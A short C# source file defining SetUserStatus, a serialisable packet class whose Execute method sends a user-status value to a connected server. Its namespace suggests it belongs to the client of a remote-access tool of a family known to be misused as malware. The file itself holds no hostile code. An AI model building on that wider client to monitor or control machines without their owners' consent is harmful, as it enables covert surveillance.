using System;
using xClient.Core.Networking;
using xClient.Enums;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class SetUserStatus : IPacket
    {
        public UserStatus Message { get; set; }

        public SetUserStatus()
        {
        }

        public SetUserStatus(UserStatus message)
        {
            Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}